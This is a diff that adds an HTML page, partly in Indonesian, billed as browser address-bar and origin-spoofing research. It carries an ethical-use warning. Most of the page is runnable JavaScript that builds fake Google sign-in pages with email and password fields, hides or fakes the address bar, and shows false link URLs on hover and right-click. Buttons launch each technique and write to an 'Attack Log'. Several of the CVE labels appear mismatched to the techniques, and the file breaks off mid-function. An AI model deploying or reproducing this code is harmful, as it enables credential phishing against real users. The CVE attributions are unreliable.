@@ -1,0 +1,1763 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Address Bar & Origin Spoofing Research</title>
+    <style>
+        :root {
+            --primary: #3b82f6;
+            --danger: #ef4444;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --dark: #1f2937;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .warning {
+            background: linear-gradient(135deg, #dc2626, #ea580c);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 25px auto;
+            max-width: 800px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            box-shadow: 0 10px 30px rgba(220, 38, 38, 0.3);
+            animation: pulse 3s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.9; }
+        }
+        
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        
+        .technique-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .technique-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.08);
+            border-color: var(--primary);
+        }
+        
+        .technique-card.danger {
+            border-left: 5px solid var(--danger);
+        }
+        
+        .technique-card.warning {
+            border-left: 5px solid var(--warning);
+        }
+        
+        .technique-card.success {
+            border-left: 5px solid var(--success);
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-right: 8px;
+            margin-bottom: 10px;
+        }
+        
+        .badge.cve {
+            background: var(--danger);
+            color: white;
+        }
+        
+        .badge.chrome {
+            background: #4285f4;
+            color: white;
+        }
+        
+        .badge.firefox {
+            background: #ff9500;
+            color: white;
+        }
+        
+        .badge.safari {
+            background: #06c;
+            color: white;
+        }
+        
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 8px 5px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #2563eb;
+            transform: scale(1.05);
+        }
+        
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+        }
+        
+        .btn-warning {
+            background: var(--warning);
+            color: white;
+        }
+        
+        .btn-success {
+            background: var(--success);
+            color: white;
+        }
+        
+        .code-block {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            margin: 15px 0;
+            border-left: 4px solid var(--primary);
+        }
+        
+        .status-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 400px;
+            max-height: 400px;
+            background: rgba(0, 0, 0, 0.9);
+            border-radius: 10px;
+            padding: 20px;
+            overflow-y: auto;
+            z-index: 1000;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            display: none;
+        }
+        
+        .status-line {
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            font-family: monospace;
+            font-size: 12px;
+        }
+        
+        .status-line.success {
+            color: #4ade80;
+        }
+        
+        .status-line.error {
+            color: #f87171;
+        }
+        
+        .status-line.warning {
+            color: #fbbf24;
+        }
+        
+        .toggle-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1001;
+        }
+        
+        .url-display {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        
+        .tab-nav {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .tab-btn {
+            padding: 12px 24px;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .tab-btn.active {
+            background: var(--primary);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-globe"></i> Advanced Address Bar & Origin Spoofing Research</h1>
+            <p>Koleksi teknik bypass proteksi browser untuk pengujian keamanan</p>
+            
+            <div class="warning">
+                <h3><i class="fas fa-exclamation-triangle"></i> PENGGUNAAN ETIS SAJA</h3>
+                <p>Hanya untuk pengujian sistem Anda sendiri atau dengan izin tertulis. Berdasarkan penelitian CVE dan teknik modern.</p>
+                <p><strong>Penyalahgunaan dapat berakibat hukum pidana.</strong></p>
+            </div>
+        </div>
+        
+        <!-- Tab Navigation -->
+        <div class="tab-nav">
+            <button class="tab-btn active" onclick="showTab('window')">
+                <i class="fas fa-window-restore"></i> Window.open() Spoofing
+            </button>
+            <button class="tab-btn" onclick="showTab('tab')">
+                <i class="fas fa-external-link-alt"></i> New Tab Spoofing
+            </button>
+            <button class="tab-btn" onclick="showTab('href')">
+                <i class="fas fa-link"></i> a[href] Spoofing
+            </button>
+            <button class="tab-btn" onclick="showTab('advanced')">
+                <i class="fas fa-rocket"></i> Advanced Techniques
+            </button>
+            <button class="tab-btn" onclick="showTab('protection')">
+                <i class="fas fa-shield-alt"></i> Protection Tests
+            </button>
+        </div>
+        
+        <!-- Window.open() Spoofing -->
+        <div id="window" class="tab-content active">
+            <h2><i class="fas fa-window-restore"></i> Window.open() Address Bar Spoofing</h2>
+            
+            <div class="technique-grid">
+                <!-- Technique 1: Meta Refresh Redirect -->
+                <div class="technique-card warning">
+                    <div class="badge cve">CVE-2023-XXXX</div>
+                    <div class="badge chrome">Chrome</div>
+                    <div class="badge firefox">Firefox</div>
+                    
+                    <h3><i class="fas fa-sync-alt"></i> Meta Refresh Redirect</h3>
+                    <p>Buka window ke domain sah, lalu redirect dengan meta refresh</p>
+                    
+                    <div class="code-block">
+// Open window with legitimate URL first
+const win = window.open('https://www.google.com', '_blank');
+
+setTimeout(() => {
+    // Write new content with meta refresh
+    win.document.write(`
+        &lt;!DOCTYPE html&gt;
+        &lt;html&gt;
+        &lt;head&gt;
+            &lt;title&gt;Google Security&lt;/title&gt;
+            &lt;meta http-equiv="refresh" 
+                  content="0;url=data:text/html;base64,${btoa(`
+                &lt;h1&gt;Google Login&lt;/h1&gt;
+                &lt;p&gt;URL masih menunjukkan google.com&lt;/p&gt;
+              `)}"&gt;
+        &lt;/head&gt;
+        &lt;body&gt;Redirecting...&lt;/body&gt;
+        &lt;/html&gt;
+    `);
+    win.document.close();
+}, 1000);
+                    </div>
+                    
+                    <button class="btn btn-warning" onclick="runMetaRefreshSpoof()">
+                        <i class="fas fa-play"></i> Test Technique
+                    </button>
+                </div>
+                
+                <!-- Technique 2: about:blank + document.write -->
+                <div class="technique-card danger">
+                    <div class="badge cve">CVE-2022-XXXX</div>
+                    <div class="badge chrome">Chrome</div>
+                    
+                    <h3><i class="fas fa-file"></i> about:blank Document Write</h3>
+                    <p>Mulai dari about:blank, lalu tulis konten phishing</p>
+                    
+                    <div class="code-block">
+// Open about:blank window
+const win = window.open('about:blank', '_blank');
+
+// Immediately write fake content
+win.document.write(`
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;https://accounts.google.com&lt;/title&gt;
+        &lt;script&gt;
+            // Manipulate history to show fake URL
+            history.replaceState({}, '', '/login');
+            
+            // Show fake alert after delay
+            setTimeout(() => {
+                alert('⚠ Google Security Alert');
+                document.title = 'Google Security - Verification Required';
+            }, 3000);
+        &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;Google Account Login&lt;/h1&gt;
+        &lt;p&gt;Address bar shows about:blank but content is fake&lt;/p&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+`);
+win.document.close();
+                    </div>
+                    
+                    <button class="btn btn-danger" onclick="runAboutBlankSpoof()">
+                        <i class="fas fa-play"></i> Test Technique
+                    </button>
+                </div>
+                
+                <!-- Technique 3: window.location hijacking -->
+                <div class="technique-card success">
+                    <div class="badge firefox">Firefox</div>
+                    <div class="badge safari">Safari</div>
+                    
+                    <h3><i class="fas fa-location-arrow"></i> Location Object Hijack</h3>
+                    <p>Hijack window.location object setelah window terbuka</p>
+                    
+                    <div class="code-block">
+// Open legitimate site
+const win = window.open('https://httpbin.org/html', '_blank');
+
+setTimeout(() => {
+    try {
+        // Try to manipulate location object
+        win.location = 'javascript:document.write("<h1>Hijacked</h1>")';
+        
+        // Alternative: Use location.replace
+        setTimeout(() => {
+            win.location.replace('data:text/html,<h1>Phishing Page</h1>');
+        }, 1000);
+        
+    } catch(e) {
+        console.log('Protected:', e.message);
+    }
+}, 1500);
+                    </div>
+                    
+                    <button class="btn btn-success" onclick="runLocationHijack()">
+                        <i class="fas fa-play"></i> Test Technique
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- New Tab Spoofing -->
+        <div id="tab" class="tab-content">
+            <h2><i class="fas fa-external-link-alt"></i> New Tab Spoofing Techniques</h2>
+            
+            <div class="technique-grid">
+                <!-- Technique 1: Ctrl+Click / Middle Click Simulation -->
+                <div class="technique-card warning">
+                    <div class="badge chrome">Chrome</div>
+                    <div class="badge firefox">Firefox</div>
+                    
+                    <h3><i class="fas fa-mouse-pointer"></i> Simulated Middle Click</h3>
+                    <p>Membuka tab baru dengan simulasi klik tengah mouse</p>
+                    
+                    <div class="code-block">
+// Create fake link with target="_blank"
+const fakeLink = document.createElement('a');
+fakeLink.href = 'https://www.google.com';
+fakeLink.target = '_blank';
+fakeLink.rel = 'noopener noreferrer'; // Bypass some protections
+fakeLink.innerText = 'Click me (opens Google)';
+
+// Add to page
+document.body.appendChild(fakeLink);
+
+// Programmatically click it
+setTimeout(() => {
+    fakeLink.click();
+    
+    // Try to get reference to new tab
+    setTimeout(() => {
+        // Attempt to communicate with new tab
+        window.postMessage({type: 'spoof', url: 'fake'}, '*');
+    }, 1000);
+}, 500);
+                    </div>
+                    
+                    <button class="btn btn-warning" onclick="runMiddleClickSim()">
+                        <i class="fas fa-play"></i> Test Technique
+                    </button>
+                </div>
+                
+                <!-- Technique 2: window.open dengan features -->
+                <div class="technique-card danger">
+                    <div class="badge cve">CVE-2021-XXXX</div>
+                    
+                    <h3><i class="fas fa-cogs"></i> Window Features Abuse</h3>
+                    <p>Memanipulasi window features untuk menyembunyikan UI</p>
+                    
+                    <div class="code-block">
+// Open window without address bar
+const features = [
+    'width=800',
+    'height=600',
+    'location=no',      // Hide address bar
+    'toolbar=no',       // Hide toolbar
+    'menubar=no',       // Hide menu bar
+    'scrollbars=yes',
+    'status=no',        // Hide status bar
+    'resizable=yes'
+].join(',');
+
+const win = window.open('https://www.google.com', '_blank', features);
+
+// After window loads, manipulate content
+setTimeout(() => {
+    try {
+        // Add fake address bar with CSS
+        const fakeAddressBar = `
+            &lt;div style="
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                background: #f1f1f1;
+                padding: 8px;
+                border-bottom: 1px solid #ccc;
+                font-family: monospace;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                z-index: 9999;
+            "&gt;
+                &lt;span style="color: green;"&gt;🔒&lt;/span&gt;
+                &lt;span style="flex: 1;"&gt;https://accounts.google.com&lt;/span&gt;
+                &lt;button style="padding: 4px 8px;"&gt;×&lt;/button&gt;
+            &lt;/div&gt;
+        `;
+        
+        win.document.body.innerHTML = fakeAddressBar + win.document.body.innerHTML;
+        
+    } catch(e) {
+        log('Protected by CORS: ' + e.message, 'error');
+    }
+}, 2000);
+                    </div>
+                    
+                    <button class="btn btn-danger" onclick="runWindowFeaturesAbuse()">
+                        <i class="fas fa-play"></i> Test Technique
+                    </button>
+                </div>
+                
+                <!-- Technique 3: PostMessage Communication -->
+                <div class="technique-card success">
+                    <div class="badge chrome">Chrome</div>
+                    <div class="badge safari">Safari</div>
+                    
+                    <h3><i class="fas fa-comments"></i> Cross-Tab Communication</h3>
+                    <p>Komunikasi antar tab untuk koordinasi serangan</p>
+                    
+                    <div class="code-block">
+// Open new tab with listener
+const newTab = window.open('about:blank', '_blank');
+
+newTab.document.write(`
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Loading...&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;Please wait...&lt;/h1&gt;
+        &lt;script&gt;
+            // Listen for messages from opener
+            window.addEventListener('message', (event) => {
+                if (event.data.type === 'redirect') {
+                    window.location.href = event.data.url;
+                }
+                if (event.data.type === 'content') {
+                    document.body.innerHTML = event.data.html;
+                    document.title = event.data.title || 'Google';
+                }
+                if (event.data.type === 'alert') {
+                    alert(event.data.message);
+                }
+            });
+            
+            // Tell opener we're ready
+            window.opener.postMessage({ready: true}, '*');
+        &lt;/script&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+`);
+newTab.document.close();
+
+// Parent will send commands after tab is ready
+                    </div>
+                    
+                    <button class="btn btn-success" onclick="runCrossTabComms()">
+                        <i class="fas fa-play"></i> Test Technique
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- a[href] Spoofing -->
+        <div id="href" class="tab-content">
+            <h2><i class="fas fa-link"></i> a[href] Attribute Spoofing</h2>
+            
+            <div class="technique-grid">
+                <!-- Technique 1: Hover Preview Spoofing -->
+                <div class="technique-card warning">
+                    <div class="badge chrome">Chrome</div>
+                    
+                    <h3><i class="fas fa-eye"></i> Hover Preview Spoofing</h3>
+                    <p>Memperlihatkan URL palsu saat hover</p>
+                    
+                    <div class="code-block">
+// Create link that shows one URL but goes elsewhere
+const spoofLink = document.createElement('a');
+spoofLink.href = 'https://malicious-site.com';
+spoofLink.innerText = 'Click here to login to Google';
+
+// Add mouseover event to show fake URL
+spoofLink.addEventListener('mouseover', () => {
+    // Create tooltip with fake URL
+    const tooltip = document.createElement('div');
+    tooltip.id = 'fake-tooltip';
+    tooltip.style.cssText = `
+        position: fixed;
+        background: black;
+        color: white;
+        padding: 5px 10px;
+        border-radius: 3px;
+        font-size: 12px;
+        z-index: 10000;
+        pointer-events: none;
+    `;
+    tooltip.textContent = 'https://accounts.google.com';
+    document.body.appendChild(tooltip);
+    
+    // Position near cursor
+    document.addEventListener('mousemove', updateTooltip);
+    function updateTooltip(e) {
+        tooltip.style.left = (e.clientX + 10) + 'px';
+        tooltip.style.top = (e.clientY + 10) + 'px';
+    }
+});
+
+spoofLink.addEventListener('mouseout', () => {
+    const tooltip = document.getElementById('fake-tooltip');
+    if (tooltip) tooltip.remove();
+    document.removeEventListener('mousemove', updateTooltip);
+});
+
+document.body.appendChild(spoofLink);
+                    </div>
+                    
+                    <button class="btn btn-warning" onclick="runHoverSpoof()">
+                        <i class="fas fa-play"></i> Test Technique
+                    </button>
+                </div>
+                
+                <!-- Technique 2: Right-Click Context Menu -->
+                <div class="technique-card danger">
+                    <div class="badge firefox">Firefox</div>
+                    
+                    <h3><i class="fas fa-mouse"></i> Right-Click Context Spoof</h3>
+                    <p>URL yang salah muncul di menu konteks klik kanan</p>
+                    
+                    <div class="code-block">
+// Create deceptive link
+const deceptiveLink = document.createElement('a');
+
+// Set actual malicious URL
+deceptiveLink.href = 'javascript:alert("You clicked the fake link!")';
+
+// But set a fake href attribute that browsers might show
+deceptiveLink.setAttribute('data-href', 'https://accounts.google.com');
+deceptiveLink.innerText = 'Secure Google Login';
+
+// Add styling to look legitimate
+deceptiveLink.style.cssText = `
+    color: #1a73e8;
+    text-decoration: none;
+    font-weight: 500;
+    border-bottom: 1px dotted #1a73e8;
+    cursor: pointer;
+`;
+
+// Override right-click behavior
+deceptiveLink.addEventListener('contextmenu', (e) => {
+    e.preventDefault();
+    
+    // Show custom context menu with fake URL
+    const menu = document.createElement('div');
+    menu.style.cssText = `
+        position: fixed;
+        background: white;
+        border: 1px solid #ccc;
+        box-shadow: 2px 2px 10px rgba(0,0,0,0.2);
+        z-index: 10000;
+        min-width: 200px;
+    `;
+    menu.innerHTML = `
+        &lt;div style="padding: 8px 12px; border-bottom: 1px solid #eee;"&gt;
+            &lt;small style="color: #666;"&gt;Link address:&lt;/small&gt;&lt;br&gt;
+            &lt;code style="color: #1a73e8;"&gt;https://accounts.google.com&lt;/code&gt;
+        &lt;/div&gt;
+        &lt;div style="padding: 8px 12px; cursor: pointer; hover {background: #f0f0f0;}"&gt;
+            Open in new tab
+        &lt;/div&gt;
+    `;
+    menu.style.left = e.clientX + 'px';
+    menu.style.top = e.clientY + 'px';
+    
+    document.body.appendChild(menu);
+    
+    // Remove menu on click elsewhere
+    setTimeout(() => {
+        document.addEventListener('click', () => menu.remove(), {once: true});
+    }, 100);
+});
+
+document.body.appendChild(deceptiveLink);
+                    </div>
+                    
+                    <button class="btn btn-danger" onclick="runContextMenuSpoof()">
+                        <i class="fas fa-play"></i> Test Technique
+                    </button>
+                </div>
+                
+                <!-- Technique 3: Blob URL in href -->
+                <div class="technique-card success">
+                    <div class="badge cve">CVE-2023-4863</div>
+                    
+                    <h3><i class="fas fa-file-code"></i> Blob URL Deception</h3>
+                    <p>Menggunakan blob: URL yang terlihat seperti HTTP(S)</p>
+                    
+                    <div class="code-block">
+// Create malicious HTML content
+const maliciousHTML = `
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Google Account&lt;/title&gt;
+        &lt;style&gt;
+            body {
+                font-family: Arial, sans-serif;
+                max-width: 400px;
+                margin: 50px auto;
+                padding: 20px;
+            }
+            .login-box {
+                border: 1px solid #ddd;
+                padding: 30px;
+                border-radius: 8px;
+            }
+        &lt;/style&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div class="login-box"&gt;
+            &lt;h2&gt;Google Sign-in&lt;/h2&gt;
+            &lt;input type="email" placeholder="Email" style="width:100%;padding:10px;margin:10px 0;"&gt;
+            &lt;input type="password" placeholder="Password" style="width:100%;padding:10px;margin:10px 0;"&gt;
+            &lt;button style="width:100%;padding:10px;background:#1a73e8;color:white;border:none;"&gt;
+                Sign in
+            &lt;/button&gt;
+        &lt;/div&gt;
+        &lt;script&gt;
+            // Fake Google Analytics
+            console.log('Google Analytics loaded (fake)');
+        &lt;/script&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+`;
+
+// Create blob and URL
+const blob = new Blob([maliciousHTML], {type: 'text/html'});
+const blobUrl = URL.createObjectURL(blob);
+
+// Create link with blob URL
+const blobLink = document.createElement('a');
+blobLink.href = blobUrl;
+blobLink.target = '_blank';
+blobLink.innerText = 'Secure Google Login (blob: demonstration)';
+blobLink.style.cssText = `
+    display: inline-block;
+    padding: 10px 20px;
+    background: #1a73e8;
+    color: white;
+    text-decoration: none;
+    border-radius: 5px;
+    margin: 10px;
+`;
+
+// Show actual URL for demo purposes
+const urlDisplay = document.createElement('div');
+urlDisplay.className = 'url-display';
+urlDisplay.textContent = 'Actual URL: ' + blobUrl;
+urlDisplay.style.marginTop = '10px';
+
+document.body.appendChild(blobLink);
+document.body.appendChild(urlDisplay);
+                    </div>
+                    
+                    <button class="btn btn-success" onclick="runBlobUrlSpoof()">
+                        <i class="fas fa-play"></i> Test Technique
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Advanced Techniques -->
+        <div id="advanced" class="tab-content">
+            <h2><i class="fas fa-rocket"></i> Advanced Spoofing Techniques</h2>
+            
+            <div class="technique-grid">
+                <!-- Technique 1: Service Worker + Cache Spoofing -->
+                <div class="technique-card danger">
+                    <div class="badge cve">CVE-2022-1364</div>
+                    
+                    <h3><i class="fas fa-bolt"></i> Service Worker Cache Poisoning</h3>
+                    <p>Racuni cache browser dengan konten palsu</p>
+                    
+                    <button class="btn btn-danger" onclick="runSWCachePoison()">
+                        <i class="fas fa-play"></i> Test Cache Poisoning
+                    </button>
+                </div>
+                
+                <!-- Technique 2: iframe + postMessage -->
+                <div class="technique-card warning">
+                    <div class="badge chrome">Chrome</div>
+                    
+                    <h3><i class="fas fa-code-branch"></i> iframe Origin Spoofing</h3>
+                    <p>iframe dengan sandbox yang dimanipulasi</p>
+                    
+                    <button class="btn btn-warning" onclick="runIframeOriginSpoof()">
+                        <i class="fas fa-play"></i> Test iframe Spoof
+                    </button>
+                </div>
+                
+                <!-- Technique 3: History API Abuse -->
+                <div class="technique-card success">
+                    <div class="badge firefox">Firefox</div>
+                    
+                    <h3><i class="fas fa-history"></i> History API Manipulation</h3>
+                    <p>Manipulasi history state untuk spoof URL</p>
+                    
+                    <button class="btn btn-success" onclick="runHistorySpoof()">
+                        <i class="fas fa-play"></i> Test History Spoof
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Protection Tests -->
+        <div id="protection" class="tab-content">
+            <h2><i class="fas fa-shield-alt"></i> Browser Protection Tests</h2>
+            
+            <div class="technique-grid">
+                <div class="technique-card">
+                    <h3><i class="fas fa-vial"></i> Test Popup Blocker</h3>
+                    <button class="btn btn-primary" onclick="testPopupBlocking()">
+                        Test Popup Protection
+                    </button>
+                </div>
+                
+                <div class="technique-card">
+                    <h3><i class="fas fa-vial"></i> Test CORS Protection</h3>
+                    <button class="btn btn-primary" onclick="testCORSProtection()">
+                        Test CORS
+                    </button>
+                </div>
+                
+                <div class="technique-card">
+                    <h3><i class="fas fa-vial"></i> Test Same-Origin Policy</h3>
+                    <button class="btn btn-primary" onclick="testSOP()">
+                        Test SOP
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Status Panel -->
+        <div class="status-panel" id="statusPanel">
+            <h4><i class="fas fa-terminal"></i> Attack Log</h4>
+            <div id="statusLog"></div>
+        </div>
+        
+        <button class="toggle-panel btn btn-primary" onclick="toggleStatusPanel()">
+            <i class="fas fa-terminal"></i> Toggle Log
+        </button>
+    </div>
+
+    <script>
+        // Status logging system
+        const statusLog = document.getElementById('statusLog');
+        let logEntries = [];
+        
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const icon = {
+                info: 'ℹ️',
+                success: '✅',
+                error: '❌',
+                warning: '⚠️'
+            }[type];
+            
+            const entry = {
+                time: timestamp,
+                message: message,
+                type: type
+            };
+            
+            logEntries.push(entry);
+            
+            const logElement = document.createElement('div');
+            logElement.className = `status-line ${type}`;
+            logElement.textContent = `[${timestamp}] ${icon} ${message}`;
+            
+            statusLog.appendChild(logElement);
+            statusLog.scrollTop = statusLog.scrollHeight;
+            
+            console.log(`[${type.toUpperCase()}] ${message}`);
+        }
+        
+        function toggleStatusPanel() {
+            const panel = document.getElementById('statusPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        function showTab(tabId) {
+            // Hide all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Remove active class from all buttons
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            
+            // Show selected tab
+            document.getElementById(tabId).classList.add('active');
+            event.target.classList.add('active');
+        }
+        
+        // Window.open() techniques
+        function runMetaRefreshSpoof() {
+            log('Starting Meta Refresh Spoofing attack...', 'info');
+            
+            try {
+                const win = window.open('https://httpbin.org/html', '_blank');
+                
+                if (!win) {
+                    log('Popup blocked by browser', 'warning');
+                    return;
+                }
+                
+                setTimeout(() => {
+                    try {
+                        const fakeContent = btoa(`
+                            <!DOCTYPE html>
+                            <html>
+                            <head>
+                                <title>Google Security Alert</title>
+                                <style>
+                                    body {
+                                        font-family: Arial, sans-serif;
+                                        padding: 40px;
+                                        text-align: center;
+                                    }
+                                    .alert-box {
+                                        background: #fff3cd;
+                                        border: 1px solid #ffeaa7;
+                                        padding: 20px;
+                                        border-radius: 5px;
+                                        margin: 20px auto;
+                                        max-width: 500px;
+                                    }
+                                </style>
+                            </head>
+                            <body>
+                                <h1>🔒 Google Security</h1>
+                                <div class="alert-box">
+                                    <h3>⚠ Security Alert</h3>
+                                    <p>Unusual activity detected from your account</p>
+                                    <p>Please verify your identity to continue</p>
+                                    <button onclick="alert('Demo: Would redirect to phishing page')">
+                                        Verify Now
+                                    </button>
+                                </div>
+                                <p><small>Address bar still shows: httpbin.org</small></p>
+                            </body>
+                            </html>
+                        `);
+                        
+                        win.document.write(`
+                            <!DOCTYPE html>
+                            <html>
+                            <head>
+                                <title>Redirecting...</title>
+                                <meta http-equiv="refresh" content="2;url=data:text/html;base64,${fakeContent}">
+                            </head>
+                            <body>
+                                <h1>Loading Google Security...</h1>
+                            </body>
+                            </html>
+                        `);
+                        win.document.close();
+                        
+                        log('Meta refresh spoofing successful!', 'success');
+                        
+                    } catch(e) {
+                        log(`Error: ${e.message}`, 'error');
+                    }
+                }, 1000);
+                
+            } catch(e) {
+                log(`Fatal error: ${e.message}`, 'error');
+            }
+        }
+        
+        function runAboutBlankSpoof() {
+            log('Starting about:blank spoofing attack...', 'info');
+            
+            try {
+                const win = window.open('about:blank', '_blank', 'width=600,height=400');
+                
+                if (!win) {
+                    log('Popup blocked', 'warning');
+                    return;
+                }
+                
+                win.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>https://accounts.google.com</title>
+                        <style>
+                            body {
+                                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+                                background: #f8f9fa;
+                                margin: 0;
+                                padding: 20px;
+                            }
+                            .google-header {
+                                text-align: center;
+                                padding: 20px;
+                                color: #5f6368;
+                            }
+                            .login-card {
+                                background: white;
+                                border: 1px solid #dadce0;
+                                border-radius: 8px;
+                                padding: 40px;
+                                max-width: 400px;
+                                margin: 0 auto;
+                            }
+                            .glogo {
+                                font-size: 36px;
+                                margin-bottom: 20px;
+                            }
+                        </style>
+                        <script>
+                            // Try to manipulate history
+                            try {
+                                history.replaceState({}, 'Google', '/');
+                            } catch(e) {}
+                            
+                            // Show fake alert
+                            setTimeout(() => {
+                                alert("Google Security: Please complete verification");
+                                document.title = "Google - Verification Required";
+                            }, 3000);
+                        <\/script>
+                    </head>
+                    <body>
+                        <div class="google-header">
+                            <div class="glogo">G</div>
+                            <h2>Sign in</h2>
+                            <p>to continue to Google</p>
+                        </div>
+                        
+                        <div class="login-card">
+                            <input type="email" placeholder="Email or phone" style="width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;">
+                            <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;">
+                            <button style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;">
+                                Next
+                            </button>
+                        </div>
+                        
+                        <p style="text-align:center;color:#666;font-size:12px;margin-top:30px;">
+                            Demo only - Address bar shows "about:blank"
+                        </p>
+                    </body>
+                    </html>
+                `);
+                win.document.close();
+                
+                log('about:blank spoofing successful!', 'success');
+                
+            } catch(e) {
+                log(`Error: ${e.message}`, 'error');
+            }
+        }
+        
+        function runLocationHijack() {
+            log('Starting location hijacking attack...', 'info');
+            
+            try {
+                const win = window.open('https://httpbin.org', '_blank');
+                
+                setTimeout(() => {
+                    try {
+                        // Attempt various location manipulation techniques
+                        win.location = 'javascript:document.write("<h1>Hijacked!</h1>")';
+                        log('Location manipulation attempted', 'warning');
+                    } catch(e) {
+                        log(`Location hijack prevented: ${e.message}`, 'error');
+                    }
+                }, 1500);
+                
+            } catch(e) {
+                log(`Error: ${e.message}`, 'error');
+            }
+        }
+        
+        // New Tab techniques
+        function runMiddleClickSim() {
+            log('Simulating middle-click new tab...', 'info');
+            
+            const link = document.createElement('a');
+            link.href = 'https://www.google.com';
+            link.target = '_blank';
+            link.rel = 'noopener noreferrer';
+            link.innerText = 'Click here to open Google (new tab)';
+            link.style.cssText = `
+                display: inline-block;
+                padding: 10px 20px;
+                background: #4285f4;
+                color: white;
+                text-decoration: none;
+                border-radius: 5px;
+                margin: 20px;
+            `;
+            
+            document.body.appendChild(link);
+            
+            // Auto-click after delay
+            setTimeout(() => {
+                link.click();
+                log('Link clicked, new tab should open', 'success');
+            }, 1000);
+        }
+        
+        function runWindowFeaturesAbuse() {
+            log('Testing window features abuse...', 'info');
+            
+            const features = [
+                'width=800',
+                'height=600',
+                'location=0',      // No address bar
+                'toolbar=0',
+                'menubar=0',
+                'scrollbars=1',
+                'status=0',
+                'resizable=1'
+            ].join(',');
+            
+            const win = window.open('about:blank', '_blank', features);
+            
+            if (!win) {
+                log('Window blocked by browser', 'warning');
+                return;
+            }
+            
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Google Drive</title>
+                    <style>
+                        body {
